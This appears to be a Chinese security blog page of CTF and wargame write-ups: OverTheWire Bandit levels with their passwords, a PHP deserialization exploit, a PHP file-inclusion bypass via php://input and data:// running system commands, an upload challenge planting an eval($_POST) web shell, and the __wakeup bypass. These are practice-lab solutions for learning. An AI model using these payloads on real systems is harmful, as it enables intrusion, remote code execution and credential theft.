bandit23@bandit:/tmp/crayon$ chmod 777 bandit24.sh 
bandit23@bandit:/tmp/crayon$ cp bandit24.sh /var/spool/bandit24/
bandit23@bandit:/tmp/crayon$ chmod 777 /tmp/crayon
bandit23@bandit:/tmp/crayon$ ls /var/spool/bandit24/
ls: cannot open directory &#39;/var/spool/bandit24/&#39;: Permission denied
bandit23@bandit:/tmp/crayon$ ls
bandit24.sh
bandit23@bandit:/tmp/crayon$ ls
bandit24.sh
bandit23@bandit:/tmp/crayon$ ls
bandit24.sh
bandit23@bandit:/tmp/crayon$ ls
bandit24.sh
# 等一会儿就有了
bandit23@bandit:/tmp/crayon$ ls
bandit24.sh  level24
bandit23@bandit:/tmp/crayon$ cat level24 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></pre><p>在/tmp/文件夹中创建一个目录。创建一个shell脚本将/etc/bandit_pass /bandit24复制到我们的/tmp/文件夹。将shell脚本复制到/var/spool/bandit24/。给shell脚本和/tmp/文件夹适当的权限。/usr/bin/cronjob_bandit24.sh这个shell的作用就是执行 /var/spool/bandit24 的脚本，60s 如果还没之行结束会强制kill掉，然后删除。所以我们写了一个把 /etc/bandit_pass/bandit24/ 输出到 /tmp/crayon的脚本到这个目录下，然后付了个权限。</p>
<p>密码：UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/13/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%BA%8C%EF%BC%89/" data-id="ckemqkebz0030asty4yv49oje" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-overthewire解题（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2020-01-12T02:37:25.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/">overthewire解题（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h1><p>直接ls<br>cat readme</p>
<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>pwd</p>
<p>cat ./.-</p>
<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><p>关于转义字符可以用反斜杠进行转义。也可以用tab键。</p>
<p><img src="/img/6.png" alt=""></p>
<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src="/img/7.png" alt=""><br>这里将文件进行了隐藏<br>直接用find找到了隐藏文件。<br>密码</p>
<blockquote>
<blockquote>
<blockquote>
<p>pIwrPrtPN36QITSp3EQaw936yaFoFgAB</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p><img src="/img/8.png" alt=""><br>这题很简单，直接一个一个文件读取就行了<br>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>koReBOKuIDDepwhWk7jZC0RTdopnAYKh</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p><img src="/img/9.png" alt=""><br>按照笨方法应该已经不能用了<br><img src="/img/10.png" alt=""><br>“ls -l”除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出，发现有很多文件夹，”find . -type f -size 1033c”，”.”查找当前目录以及子目录，-type f指定文件类型为普通文件，-size 1033c指定文件大小为 1033 bytes.<br>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>DXjZPULLxYr17uwoI01bNLQbtFemEgo7</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>grep（global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。<br><img src="/img/11.png" alt=""><br>“/“ linux 根目录,从最顶层开始查找，”2&gt;/dev/null”中”2”表示错误输出，”&gt;”是重定向符号表示把信息送到哪里，”/dev/null”是Linux黑洞.</p>
<p>密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p>
<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>The password for the next level is stored in the file data.txt next to the word millionth</p>
<p>Commands you may need to solve this level<br>grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd</p>
<p>sort命令是在Linux里非常有用，它将文件进行排序，并将排序结果标准输出。sort命令既可以从特定的文件，也可以从stdin中获取输入。以从特定的文件，也可以从stdin中获取输入。</p>
<p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。</p>
<p>uniq 可检查文本文件中重复出现的行列。</p>
<p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。</p>
<p><img src="/img/12.png" alt=""></p>
<p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p>
<p>sort命令用于将文本文件内容加以排序，可针对文本文件的内容，以行为单位来排序。”uniq -u”是上下相邻两行对比得到是否为单一行。</p>
<p>密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p>
<h1 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h1><p>过程：</p>
<pre><code>bandit9@bandit:~$ ls
data.txt
bandit9@bandit:~$ strings data.txt | grep ==
========== theP`
========== password
L========== isA
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束，用 grep 命令筛选 含有”==”的字符串。</code></pre><p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>KLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h1><p><img src="/img/13.png" alt=""><br>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h1><p>下一级别的密码存储在文件data.txt中，其中所有小写（az）和大写（AZ）字母都已旋转了13个位置<br><img src="/img/15.png" alt=""><br>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</p>
</blockquote>
</blockquote>
</blockquote>
<h1 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h1><p>xxd 命令用于使用二进制或十六进制格式显示文件内容，可以将指定文件或标准输入以十六进制转储,也可以把十六进制转储转换成原来的二进制形式。<br>过程：</p>
<pre><code>bandit12@bandit:~$ ls
data.txt
bandit12@bandit:~$ mkdir /tmp/Crayon123; cp data.txt /tmp/Crayon123/data_1; cd /tmp/Crayon123
bandit12@bandit:/tmp/Crayon123$ cat data_1 ;file data_1 
00000000: 1f8b 0808 ecf2 445a 0203 6461 7461 322e  ......DZ..data2.
00000010: 6269 6e00 0149 02b6 fd42 5a68 3931 4159  bin..I...BZh91AY
00000020: 2653 5930 3e1b 4000 0014 ffff dde3 2b6d  &amp;SY0&gt;.@.......+m
00000030: afff dd1e dfd7 ffbf bdfb 3f67 bfff ffff  ..........?g....
00000040: bde5 bfff aff7 bfdb e5ff ffef b001 39b0  ..............9.
00000050: 480d 3400 0068 0068 1a00 0000 01a3 4000  H.4..h.h......@.
00000060: 0001 a643 4d34 0000 d00d 0698 800d 1934  ...CM4.........4
00000070: d0c4 d034 1a36 a343 646a 1c9a 3206 9a00  ...4.6.Cdj..2...
00000080: 3406 8000 068d 064f 51a3 4000 000f 5000  4......OQ.@...P.
00000090: 6868 0034 d308 0da4 6990 1a03 4000 6869  hh.4....i...@.hi
000000a0: a0d0 00d3 2341 94d0 0006 8006 8034 1a34  ....#A.......4.4
000000b0: 00d0 d000 0310 d068 3400 001e 900d 1a19  .......h4.......
000000c0: 0062 68d3 4680 640f 48d0 d320 0068 621a  .bh.F.d.H.. .hb.
000000d0: 0543 0116 180c 6232 a7d7 82c8 7bd4 2374  .C....b2....&#123;.#t
000000e0: 1de5 e375 b7b9 0b78 2d37 bd61 5cdf 40da  ...u...x-7.a\.@.
000000f0: b8e5 3258 213d e4bb ecb2 8d51 84f9 3bd0  ..2X!=.....Q..;.
00000100: b1c9 ef2a bcff 45cc 1f1c 0028 1cfe 8784  ...*..E....(....
00000110: 78a9 7611 0a81 c4d5 cb26 4b80 7888 c9bc  x.v......&amp;K.x...
00000120: 2b3e a351 59ae c1fd 36c8 286e d6c3 bb2b  +&gt;.QY...6.(n...+
00000130: b280 d19b 70b3 190a 0204 4603 9f79 e2b8  ....p.....F..y..
00000140: cf1b 8330 fcad 3780 86c2 5c3d 5bc9 4631  ...0..7...\=[.F1
00000150: 3718 5e2e a88c 34e6 8461 35ad c14f 6fd4  7.^...4..a5..Oo.
00000160: 31dd a5cc 5223 545e e01d ff23 cde3 22cc  1...R#T^...#..&quot;.
00000170: 22fa a62b e27a dfa5 d4f0 c326 28ef a4b3  &quot;..+.z.....&amp;(...
00000180: adc5 149c 1c27 dbc4 97b9 6342 487e bfe3  .....&#39;....cBH~..
00000190: 02ee d63e 3379 8ebc d559 c670 7987 da1d  ...&gt;3y...Y.py...
000001a0: 4c4b 5ec4 9965 075b 9d0b 08ee df17 d07c  LK^..e.[.......|
000001b0: ea9a 5fbf 43e7 d405 5239 1437 0c8a 34cd  .._.C...R9.7..4.
000001c0: be6f a949 b061 68e8 6ba5 c9ba 4112 0819  .o.I.ah.k...A...
000001d0: 7cb9 a3c8 bff1 0895 1819 8f80 407e dc32  |...........@~.2
000001e0: 9269 ca68 3f58 bb30 cd9b fcd6 0006 1224  .i.h?X.0.......$
000001f0: 177b fe66 c676 01f0 a5bc 9131 6746 cc85  .&#123;.f.v.....1gF..
00000200: 1a39 e46f 6b9a 7bd4 694b e999 c300 b57e  .9.ok.&#123;.iK.....~
00000210: 9b0a 1229 fac1 cc0c 24fb a905 a06a b8cf  ...)....$....j..
00000220: cb56 2a73 6016 6950 8208 5785 af54 0d42  .V*s`.iP..W..T.B
00000230: 754e 5a48 8835 2b47 aa9b c45e 4ca8 a7a0  uNZH.5+G...^L...
00000240: 61dd e070 7717 9346 5f14 d808 8263 7746  a..pw..F_....cwF
00000250: 5100 3af8 fa20 ff8b b922 9c28 4818 1f0d  Q.:.. ...&quot;.(H...
00000260: a000 e793 1e61 4902 0000                 .....aI...
data_1: ASCII text
bandit12@bandit:/tmp/Crayon123$ xxd -r data_1 &gt; data_2 ; file data_2
data_2: gzip compressed data, was &quot;data2.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/Crayon123$ mv data_2 data_3.gz ;
bandit12@bandit:/tmp/Crayon123$ gzip -d data_3.gz ;
bandit12@bandit:/tmp/Crayon123$ ls
data_1  data_3
bandit12@bandit:/tmp/Crayon123$ file data_3
data_3: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/Crayon123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ;
bandit12@bandit:/tmp/Crayon123$ ls
data_1  data_4
bandit12@bandit:/tmp/Crayon123$ file data_4
data_4: gzip compressed data, was &quot;data4.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/Crayon123$ mv data_4 data_5.gz ; gzip -d data_5.gz  
bandit12@bandit:/tmp/Crayon123$ ls
data_1  data_5
bandit12@bandit:/tmp/Crayon123$ file data_5
data_5: POSIX tar archive (GNU)
bandit12@bandit:/tmp/Crayon123$ mv data_5 data_6.tar ; tar -xvf data_6.tar
data5.bin
bandit12@bandit:/tmp/Crayon123$ ls
data5.bin  data_1  data_6.tar
bandit12@bandit:/tmp/Crayon123$ file data5.bin 
data5.bin: POSIX tar archive (GNU)
bandit12@bandit:/tmp/Crayon123$ mv data5.bin data_7.tar; tar -xvf data_7.tar
data6.bin
bandit12@bandit:/tmp/Crayon123$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
bandit12@bandit:/tmp/Crayon123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2
bandit12@bandit:/tmp/Crayon123$ ls
data_1  data_6.tar  data_7.tar  data_8
bandit12@bandit:/tmp/Crayon123$ file data_8
data_8: POSIX tar archive (GNU)
bandit12@bandit:/tmp/Crayon123$ mv data_8 data_9.tar ; tar -xvf data_9.tar
data8.bin
bandit12@bandit:/tmp/Crayon123$ ls
data8.bin  data_1  data_6.tar  data_7.tar  data_9.tar
bandit12@bandit:/tmp/Crayon123$ file data8.bin 
data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Thu Dec 28 13:34:36 2017, max compression, from Unix
bandit12@bandit:/tmp/Crayon123$ mv data8.bin data_10.gz ; gzip -d data_10.gz
bandit12@bandit:/tmp/Crayon123$ ls
data_1  data_10  data_6.tar  data_7.tar  data_9.tar
bandit12@bandit:/tmp/Crayon123$ file data_10
data_10: ASCII text
bandit12@bandit:/tmp/Crayon123$ cat data_10
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
其实这一题并不是很难，一步一步看解题过程就明白怎么回事了，文件最开始是16进制，用” xxd -r”将16进制文件转换为二进制文件，然后每一步都查看一次文件类型，并重命名为相应的文件类型，主要运用”bzip2 -d”,”gzip -d”,”tar -xvf”以及`这些解压方法。</code></pre><p>密码：</p>
<blockquote>
<blockquote>
<blockquote>
<p>yCRiBWFYkneahHwxCv3wb2a1ORpYL</p>
</blockquote>
</blockquote>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/12/overthewire%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckemqkebd001xasty57tu3jey" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Jarvis-OJ-神盾局的秘密" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/" class="article-date">
  <time datetime="2020-01-11T10:44:56.000Z" itemprop="datePublished">2020-01-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/">Jarvis OJ 神盾局的秘密</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>神盾局的秘密<br>题目链接：<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32768/">http://web.jarvisoj.com:32768/</a><br>题目提示:</p>
<p>这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</p>
<p>访问链接之后，得到就是一张图片，通过burp抓包，发现在中途访问了网址<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。">http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocA==，看链接是一个文件读取，文件名是使用base64加密了。</a><br>读取showimg.php的内容:</p>
<pre><code>&lt;?php
    $f = $_GET[&#39;img&#39;];
    if (!empty($f)) &#123;
        $f = base64_decode($f);
        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) &#123;
            readfile($f);
        &#125; else &#123;
            echo &quot;File not found!&quot;;
        &#125;
    &#125;
?&gt;</code></pre><p>普通的内容，没有与Flag相关的信息。<br>尝试读取index.php的信息:</p>
<pre><code>&lt;?php 
    require_once(&#39;shield.php&#39;);
    $x = new Shield();
    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
    if (!empty($g)) &#123;
        $x = unserialize($g);
    &#125;
    echo $x-&gt;readfile();
?&gt;</code></pre><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤。<br>读取shield.php信息：</p>
<pre><code>&lt;?php
    //flag is in pctf.php
    class Shield &#123;
        public $file;
        function __construct($filename = &#39;&#39;) &#123;
            $this -&gt; file = $filename;
        &#125;

      function readfile() &#123;
          if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
          &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
              return @file_get_contents($this-&gt;file);
          &#125;
      &#125;
  &#125;</code></pre><p>  ?&gt;<br>说明了Flag在pctf.php中，结合index.php的源代码。得到最后的Flag信息。但是我们需要一个Shield类的实例$X,实例$x中的file属性为pctf.php。但是目前的代码无法做到这一点。但是想了很久都没有想到，最后请教了40huo。最后知道需要本地搭建环境，对示例进行序列话。<br>index.php</p>
<pre><code>&lt;?php
    require_once(&#39;shield.php&#39;);
    $x = new Shield();
    echo serialize($x);
?&gt;</code></pre><p>  shield.php</p>
<pre><code>&lt;?php
    //flag is in pctf.php
    class Shield &#123;
        public $file;
        function __construct($filename = &#39;pctf.php&#39;) &#123;
            $this -&gt; file = $filename;
        &#125;
        function readfile() &#123;
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
                return @file_get_contents($this-&gt;file);
            &#125;
        &#125;
    &#125;
?&gt;</code></pre><p>最关键的代码就是,在进行初始化的时候，将$filename赋值为pctf.php</p>
<pre><code>function __construct($filename = &#39;pctf.php&#39;) &#123;
    $this -&gt; file = $filename;
&#125;</code></pre><p>最后得到的序列话的值是：</p>
<pre><code>O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;</code></pre><p>最后访问URL:<a target="_blank" rel="noopener" href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}</a><br>页面返回:</p>
<pre><code>&lt;?php 
    //Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;
    //Fake flag:
    echo &quot;FLAG: PCTF&#123;I_4m_not_fl4g&#125;&quot;
?&gt;</code></pre>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/11/Jarvis-OJ-%E7%A5%9E%E7%9B%BE%E5%B1%80%E7%9A%84%E7%A7%98%E5%AF%86/" data-id="ckemqkeae0006astygdxlcgkh" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Jarvis-OJ/" rel="tag">Jarvis OJ</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-python模板注入" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
  <time datetime="2020-01-10T12:08:15.000Z" itemprop="datePublished">2020-01-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB%EF%BC%8Cpython/">WEB，python</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">python模板注入</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<p>攻防世界中模板注入例题的wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40884727/article/details/101605002">https://blog.csdn.net/qq_40884727/article/details/101605002</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/102857726">https://blog.csdn.net/qq_17204441/article/details/102857726</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/01/10/python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" data-id="ckemqkebg0028asty3h6j64ml" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-攻防世界web进阶区" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" class="article-date">
  <time datetime="2019-12-28T04:42:36.000Z" itemprop="datePublished">2019-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/">攻防世界web进阶区Web_php_include</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p><img src="/img/php1.png" alt=""></p>
<p>strstr() 函数搜索字符串在另一字符串中的第一次出现。<br>注释：该函数是二进制安全的。<br>注释：该函数对大小写敏感。如需进行不区分大小写的搜索，请使用 stristr() 函数。</p>
<p>那就利用大小写绕过输入：</p>
<blockquote>
<blockquote>
<p>?page=phP://input</p>
</blockquote>
</blockquote>
<p><img src="/img/php2.png" alt=""><br>图片里我忘记打成大写了。</p>
<p><img src="/img/php3.png" alt=""></p>
<p>直接访问flag发现一片空白。</p>
<p><img src="/img/php4.png" alt=""></p>
<p>那就继续在burp里用cat命令访问，成功取得flag。</p>
<p>事后观看其他人的思路还可以用data直接查看：</p>
<blockquote>
<blockquote>
<p>?page=data:text/plain,<?php%20system("cat%20fl4gisisish3r3.php");?></p>
</blockquote>
</blockquote>
<p>或者麻烦一点用菜刀也可以做出来。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E8%BF%9B%E9%98%B6%E5%8C%BA/" data-id="ckemqkebx002vastyhwkr4mx8" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-攻防世界upload1总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2019-12-28T03:30:40.000Z" itemprop="datePublished">2019-12-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/">攻防世界upload1总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="攻防世界web进阶区upload1"><a href="#攻防世界web进阶区upload1" class="headerlink" title="攻防世界web进阶区upload1"></a>攻防世界web进阶区upload1</h1><p>打开题目网站，直接出现了一个上传的界面，试着直接点一个php文件进行上传。发现上传的那个按钮直接变灰，无法点击。于是又点了一个1.jpg文件。</p>
<blockquote>
<blockquote>
<blockquote>
<?php phpinfo();?>
</blockquote>
</blockquote>
</blockquote>
<p>然后上传用burp suite进行拦截直接改名为php。发现上传成功。并且页面显示上传文件后的路径，进行访问。<br>果真显示了phpinfo的界面<br><img src="/img/caidao3.png" alt=""><br>嗯。。。。那就用菜刀进行连接，传一个一句话代码。</p>
<blockquote>
<blockquote>
<blockquote>
<?php @eval($_POST['caidao']);?>
</blockquote>
</blockquote>
</blockquote>
<p>然后打开菜刀进行连接。额。。。。失败了。<br>然后进行百度发现我传入菜刀时，忘记修改后缀名，将jpg改成php。</p>
<p><img src="/img/caidao2.png" alt=""><br><img src="/img/caidai1.png" alt=""></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/28/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cupload1%E6%80%BB%E7%BB%93/" data-id="ckemqkebw002uastyee8scd40" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-wakeup漏洞绕过" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/" class="article-date">
  <time datetime="2019-12-25T08:41:13.000Z" itemprop="datePublished">2019-12-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/WEB/">WEB</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/25/wakeup%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87/">__wakeup漏洞绕过</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="wakeup-函数用法"><a href="#wakeup-函数用法" class="headerlink" title="__wakeup()函数用法"></a>__wakeup()函数用法</h2><p><strong>wakeup()是用在反序列化操作中。unserialize()会检查存在一个</strong>wakeup()方法。如果存在，则先会调用__wakeup()方法。</p>
<pre><code>&lt;?php
class A&#123;
function __wakeup()&#123;
echo &#39;Hello&#39;;
&#125;
&#125;
$c = new A();
$d=unserialize(&#39;O:1:&quot;A&quot;:0:&#123;&#125;&#39;);
?&gt;</code></pre><p>最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello<br>__wakeup()函数漏洞说明</p>
<pre><code>&lt;?php
class Student&#123;
public $full_name = &#39;zhangsan&#39;;
public $score = 150;
public $grades = array();

function __wakeup() &#123;
echo &quot;__wakeup is invoked&quot;;
&#125;
&#125;

$s = new Student();
var_dump(serialize($s));
?&gt;</code></pre><p>最后页面上输出的就是Student对象的一个序列化输出，<br>O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。<br><strong>wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过</strong>wakeup的执行。<br>当我们将上述的序列化的字符串中的对象属性修改为5，变为<br>O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}。<br>最后执行运行的代码如下：</p>
<pre><code>class Student&#123;
public $full_name = &#39;zhangsan&#39;;
public $score = 150;
public $grades = array();

function __wakeup() &#123;
echo &quot;__wakeup is invoked&quot;;
&#125;
function __destruct() &#123;
var_dump($this);
&#125;
&#125;

$s = new Student();
$stu = unserialize(&#39;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#39;);</code></pre><p>可以看到这样就成功地绕过了__wakeup()函数。</p>

      
    </div>
    <footer class="article-footer">
